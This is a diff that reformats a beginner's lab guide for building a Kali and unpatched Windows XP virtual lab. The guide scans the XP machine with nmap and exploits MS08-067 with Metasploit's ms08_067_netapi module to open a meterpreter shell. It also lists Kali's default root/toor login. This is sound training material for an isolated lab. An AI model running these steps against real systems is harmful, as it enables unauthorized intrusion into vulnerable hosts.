@@ -20,68 +20,69 @@ these steps in this short guide. This guide is NOT for people that have no idea 
 configure Linux/Windows O/S or VMs. Google is your best friend and research is part of the job.
 
 COMMONS COMMANDS TO KNOW:
-•	ls		- Lists Files (LS)
-•	pwd		- Prints the current path to screen
-•	cd		- Call Directory
-•	mkdir		- Make Directory
-•	rm		- Deletes a folder and files in it (also rm –rf, or rmdir)
-•	cat		- Prints the contents of a file to screen
-•	ifconfig		- Displays local network information
-•	echo		- Repeats a command to screen and assist in creating a file (Windows)
-•	ren		- Rename a file or folder (Windows)
+• ls		- Lists Files (LS)
+• pwd		- Prints the current path to screen
+• cd		- Call Directory
+• mkdir		- Make Directory
+• rm		- Deletes a folder and files in it (also rm –rf, or rmdir)
+• cat		- Prints the contents of a file to screen
+• ifconfig		- Displays local network information
+• echo		- Repeats a command to screen and assist in creating a file (Windows)
+• ren		- Rename a file or folder (Windows)
 
 LEGEND:
-•	Commands: 	Words in BOLD are commands
-•	Comments: 	Words in italic red are comments…many have additional commands
-•	Important: 	Words with asterisk lines are important notes
+• Commands: 	Words in BOLD are commands
+• Comments: 	Words in italic red are comments…many have additional commands
+• Important: 	Words with asterisk lines are important notes
 ****************************************************
 
 DEFAULT LOGINS:
-•	Kali: root/toor
+• Kali: root/toor
 
 WHAT YOU’LL NEED FOR THIS EXERCISE:
-•	A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
-•	ISO file of Windows XP SP2 or SP3 without Windows Update MS08_067
-•	ISO file of the latest Kali release
-•	OracleVirtualbox (free) or VMWare Workstation 12 or higher
+• A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
+• ISO file of Windows XP SP2 or SP3 without Windows Update MS08_067
+• ISO file of the latest Kali release
+• OracleVirtualbox (free) or VMWare Workstation 12 or higher
 
 ******************************************************************************
-NOTE: When using a VM make sure you change your resolution to the highest you can use without having any scroll bars on the sides or the bottom of the screen.
+NOTE: When using a VM make sure you change your resolution to the highest you can use without having any scroll bars on the
+sides or the bottom of the screen.
 ******************************************************************************
 
 SETUP:
-1.	Install the VM application you want, then install Kali and Windows XP as VMs.
-2.	Give the VMs:
-a.	Windows = 1 CPU/1 Core, 1GB RAM, and 8GB of HDD space.
-b.	Kali = 1 CPU/2 Cores, 4GB RAM and 40GB HDD space.
-3.	Maximize the GPU memory on both Kali (1GB) and XP (512MB).
-a.	Do not use 3D on any of them.
-4.	Make sure both VMs networks are in NAT so they use the same network range. There is no need to be connected to the Internet for this to work.
+1. Install the VM application you want, then install Kali and Windows XP as VMs.
+2. Give the VMs:
+  a. Windows = 1 CPU/1 Core, 1GB RAM, and 8GB of HDD space.
+  b. Kali = 1 CPU/2 Cores, 4GB RAM and 40GB HDD space.
+3. Maximize the GPU memory on both Kali (1GB) and XP (512MB).
+  a. Do not use 3D on any of them.
+4. Make sure both VMs networks are in NAT so they use the same network range. There is no need to be connected to the Internet for this to work.
 
 ATTACK:
 Run both Kali and XP VMs.
 
-1.	Find your IP address…
-a.	Type: ifconfig
+1. Find your IP address…
+  a. Type: ifconfig
 
-2.	In Kali scan for live-hosts…
-a.	Type: nmap –sn <target>/24
-i.	Annotate your findings like IPs and their services running if any
+2. In Kali scan for live-hosts…
+  a. Type: nmap –sn <target>/24
+    i. Annotate your findings like IPs and their services running if any
 
-3.	Select your target and scan for open ports in stealth mode…
-a.	Type: nmap –sS –Pn <target>
-i.	Notice the SMB port service is running…we’ll use it on our attack
+3. Select your target and scan for open ports in stealth mode…
+  a. Type: nmap –sS –Pn <target>
+    i. Notice the SMB port service is running…we’ll use it on our attack
 
-4.	Open a new terminal and run metasploit…
-a.	Type: msfconsole
-b.	Type: use exploit/windows/smb/ms08_067_netapi
-i.	Have you used the TAB key to autocomplete a command?
-c.	Type: set
-i.	Look at your options…also use the show options if you cannot find the RHOST
-d.	Type: set RHOST
-i.	To the XP IP address
-e.	Type: run
-i.	Or exploit to start
+4. Open a new terminal and run metasploit…
+  a. Type: msfconsole
+  b. Type: use exploit/windows/smb/ms08_067_netapi
+    i. Have you used the TAB key to autocomplete a command?
+  c. Type: set
+    i. Look at your options…also use the show options if you cannot find the RHOST
+  d. Type: set RHOST
+    i. To the XP IP address
+  e. Type: run
+    i. Or exploit to start
 
 ******************************************************************************
 NOTE: You’re in meterpreter, a command shell connecting you to your target.
